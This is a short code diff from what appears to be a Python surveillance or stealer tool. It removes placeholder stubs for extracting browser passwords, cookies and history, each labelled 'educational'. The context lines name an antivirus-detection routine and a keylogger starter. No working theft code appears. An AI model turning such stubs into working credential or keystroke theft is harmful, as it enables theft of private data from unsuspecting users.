@@ -377,42 +377,7 @@ def _check_antivirus():
     
     return av_products
 
-def _get_browser_passwords():
-    """Extract browser passwords (educational)"""
-    try:
-        # This is a simulation for educational purposes
-        browsers = {
-            'chrome': 'Password extraction requires additional modules',
-            'firefox': 'Password extraction requires additional modules', 
-            'edge': 'Password extraction requires additional modules'
-        }
-        return browsers
-    except:
-        return {'error': 'Password extraction failed'}
 
-def _get_browser_cookies():
-    """Extract browser cookies (educational)"""
-    try:
-        browsers = {
-            'chrome': 'Cookie extraction requires additional modules',
-            'firefox': 'Cookie extraction requires additional modules',
-            'edge': 'Cookie extraction requires additional modules'
-        }
-        return browsers
-    except:
-        return {'error': 'Cookie extraction failed'}
-
-def _get_browser_history():
-    """Extract browser history (educational)"""
-    try:
-        browsers = {
-            'chrome': 'History extraction requires additional modules',
-            'firefox': 'History extraction requires additional modules',
-            'edge': 'History extraction requires additional modules'
-        }
-        return browsers
-    except:
-        return {'error': 'History extraction failed'}
 
 def _start_keylogger():
     """Start keylogger"""
